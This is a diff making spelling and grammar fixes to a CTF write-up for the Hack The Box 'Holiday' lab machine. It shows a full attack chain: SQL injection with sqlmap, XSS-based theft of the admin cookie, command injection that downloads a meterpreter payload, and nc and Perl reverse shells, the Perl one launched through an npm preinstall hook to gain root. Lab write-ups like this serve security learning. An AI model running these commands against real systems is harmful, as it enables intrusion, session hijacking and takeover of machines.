@@ -8,7 +8,7 @@ Target: 10.10.10.25(Linux)
 
 Kali: 10.10.16.65
 
-Holiday is a insane box officially. It's really difficult to get the user permission. The most difficult part should be how to pass xss filter. It may need a lot of time. And the root privesc is based on the exploitation of npm install which is relatively fresh.
+Holiday is an insane box officially. It's really difficult to get the user permission. The most difficult part should be how to pass the XSS filter. It may need a lot of time. And the root privesc is based on the exploitation of npm install which is relatively fresh.
 
 ## Information enumeration
 
@@ -49,15 +49,15 @@ HOP RTT       ADDRESS
 2   322.47 ms htb.holiday (10.10.10.25)
 ```
 
-There are only two ports open. The port 8000 is a HTTP service which is hosted by Express. It should be our breakthrough.
+There are only two ports open. The port 8000 is an HTTP service which is hosted by Express. It should be our breakthrough.
 
-## Exploitaion
+## Exploitation
 
-Access to `http://10.10.10.25:8000`, there is nothing except a image. Download the image, and try to see more information about the image with exiftoo. Nothing interesting found.
+Access to `http://10.10.10.25:8000`, there is nothing except an image. Download the image, and try to see more information about the image with ExifTool. Nothing interesting found.
 
 [![EjY0mV.png](https://s2.ax1x.com/2019/05/19/EjY0mV.png)](https://imgchr.com/i/EjY0mV)
 
-Then try to brute force the direcory. Gobuster and dirbuster seem not to be very useful for this box. If you try dirb, you will soon find some important directories, including: admin, login. Try to access `http://10.10.10.25:8000/login`. It is a login web page. Try to login with some default credentials. Not work. Then use burp to save the login request to a file.
+Then try to brute force the directory. Gobuster and dirbuster seem not to be very useful for this box. If you try dirb, you will soon find some important directories, including admin, login. Try to access `http://10.10.10.25:8000/login`. It is a login web page. Try to login with some default credentials. Not work. Then use burp to save the login request to a file.
 
 ```
 POST /login HTTP/1.1
@@ -77,7 +77,7 @@ username=admin&password=admin
 
 ### Sqlmap
 
-Try to use sqlmap to brute force the login request. Due to the awful network or something, sqlmap is slow for me to use for the boxed in hack the box. So try to prefer get some important information instead of dump all information in sqlmap. For example, obtain tables firstly. Then dig into the interesting table.
+Try to use sqlmap to brute force the login request. Due to the awful network or something, sqlmap is slow for me to use for the boxed in hack the box. So try to prefer to get some important information instead of dump all information in sqlmap. For example, obtain tables firstly. Then dig into the interesting table.
 
 ```
 sqlmap -r sql.req --level=5 --risk=3 --tables --threads=10
@@ -97,13 +97,13 @@ A user is found. [Hashkiller](https://hashkiller.co.uk/Cracker) is a wonderful h
 
 ![Ej464e.png](https://s2.ax1x.com/2019/05/19/Ej464e.png)
 
-Login with this user. It seems to be a booking website.
+Log in with this user. It seems to be a booking website.
 
 ![Ej5nUO.png](https://s2.ax1x.com/2019/05/19/Ej5nUO.png)
 
 ![Ej4Lgs.png](https://s2.ax1x.com/2019/05/19/Ej4Lgs.png)
 
-Click any booking and see the booking details. It consits of two tabs, including View and Notes. In the Notes, one word is interesting: "All notes must be approved by an administrator - this process can take up to 1 minute." Administrator is always attractive to hackers. It seems that the note will be approved by administrator. So it's possible to steal the session cokie of administrator if there is a xss vulnerability in the note edit form. I think it's the hardest part of this box. It's not easy to find the approprivate pass way. There is a way to utilize `fromCharCode` and other skills to pass the xss filter. The following javascript code is utilized to generate the payload:
+Click any booking and see the booking details. It consists of two tabs, including View and Notes. In Notes, one word is interesting: "All notes must be approved by an administrator - this process can take up to 1 minute." An administrator is always attractive to hackers. It seems that the note will be approved by the administrator. So it's possible to steal the session cookie of the administrator if there is an XSS vulnerability in the note edit form. I think it's the hardest part of this box. It's not easy to find the appropriate pass way. There is a way to utilize `fromCharCode` and other skills to pass the XSS filter. The following javascript code is utilized to generate the payload:
 
 ![admin](https://s2.ax1x.com/2019/05/19/Ej4oE8.png)
 
@@ -122,15 +122,15 @@ console.log(payload);
 ```
 ![Ejv2od.png](https://s2.ax1x.com/2019/05/19/Ejv2od.png)
 
-Set kali listen to port 80: `nc -lvnp 80`. The code can be run in the chrome dev. Input the generated payload into the note, wait a minute the data will be sent to kali. 
+Set kali to listen to port 80: `nc -lvnp 80`. The code can be run in the chrome dev. Input the generated payload into the note, wait a minute the data will be sent to kali. 
 
 
 
-The cookie of the administrator is obtained which is html encoded. Decode it with burp. And chage the cookie in the storage of firefox. Refesh the web page. Now you can hijack the administrator session cookie. Access to `http://10.10.10.25:8000/admin`. There seems nothing special except two buttons, including: Booking and Notes. 
+The cookie of the administrator is obtained which is HTML encoded. Decode it with a burp. And change the cookie in the storage of firefox. Refresh the web page. Now you can hijack the administrator session cookie. Access to `http://10.10.10.25:8000/admin`. There seems nothing special except two buttons, including Booking and Notes. 
 
 ![EjjOxK.png](https://s2.ax1x.com/2019/05/19/EjjOxK.png)
 
-After some exploration, you will find that there are command injection in the two function url. You can try to access `http://10.10.10.25:8000/admin/export?table=notes%26ls`. You can found the directories in the exported file. One thing should be noticed, as `&` has been prohibited. So you can pass this by `%26`. Hence, it seems that the table name exits RCE. But it's limited to charaters, numbers and `/`. So you should try to RCE by these. It's not possible to use command to obtain reverse shell by command. For example, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`. As many characters is not allowed.
+After some exploration, you will find that there is command injection in the two function url. You can try to access `http://10.10.10.25:8000/admin/export?table=notes%26ls`. You can find the directories in the exported file. One thing should be noticed, as `&` has been prohibited. So you can pass this by `%26`. Hence, it seems that the table name exists RCE. But it's limited to characters, numbers and `/`. So you should try to RCE by these. It's not possible to use the command to obtain reverse shell by command. For example, `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`. As many characters is not allowed.
 
 ![Ev7Txg.png](https://s2.ax1x.com/2019/05/20/Ev7Txg.png)
 
@@ -140,7 +140,7 @@ Utilize msfvenom to generate the payload:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.16.65 LPORT=1234 -f elf > shell
 ```
 
-Then upload the shell to the victim and execute it. As you are not allowed to use `.`. So convert IP address to decimal by [this website](https://www.ipaddressguide.com/ip). Access the following urls to execute the corresponding commands:
+Then upload the shell to the victim and execute it. As you are not allowed to use `.`. So convert the IP address to decimal by [this website](https://www.ipaddressguide.com/ip). Access the following URLs to execute the corresponding commands:
 
 * upload shell: `http://10.10.10.25:8000/admin/export?table=notes%26cd%20/tmp%20%26%26wget%20168431681/shell`
 * change permission: `http://10.10.10.25:8000/admin/export?table=notes%26chmod%20777%20/tmp/shell`
@@ -164,7 +164,7 @@ Then, we get the shell!
 
 ## Privilege escalation
 
-Check the sudo premission firstly: `sudo -l`. You will find the user has the permission to execute `sudo npm i`. [rimrafall](https://github.com/joaojeronimo/rimrafall) this repository has describle that npm install may be dangerous. It can be utilized to execute commands. You can upload the directory to the victim or create one by yourself.
+Check the sudo permissions firstly: `sudo -l`. You will find the user has the permission to execute `sudo npm i`. [rimrafall](https://github.com/joaojeronimo/rimrafall) this repository has described that npm install may be dangerous. It can be utilized to execute commands. You can upload the directory to the victim or create one by yourself.
 
 ```
 cd app
@@ -173,7 +173,7 @@ cd rimrafall
 echo "module.exports = "install my be dangerousr"" > index.js
 ```
 
-Create the `package.json` and upload it to the target directory. `preinstall` can be utilized to execute command. I have found that some command to obtain reverse shell is not useful. As perl is install in the machine. And create a file called prel3 to obtain the reverse shell.
+Create the `package.json` and upload it to the target directory. `preinstall` can be utilized to execute the command. I have found that some command to obtain a reverse shell is not useful. As Perl is installed in the machine. And create a file called prel3 to obtain the reverse shell.
 
 ```
 
@@ -199,11 +199,6 @@ Create the `package.json` and upload it to the target directory. `preinstall` ca
 use Socket;$i="10.10.16.65";$p=3344;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
 ```
 
-Set kali listen to port 3344: `nc -lvnp 3344`. In the victim, execute by: `sudo npm i rimrafall`. Now, we are root!
+Set kali listen to port 3344: `nc -lvnp 3344`. In the victim, executed by: `sudo npm i rimrafall`. Now, we are root!
 
 ![EvqfaR.png](https://s2.ax1x.com/2019/05/20/EvqfaR.png)
-
-
-
-
-
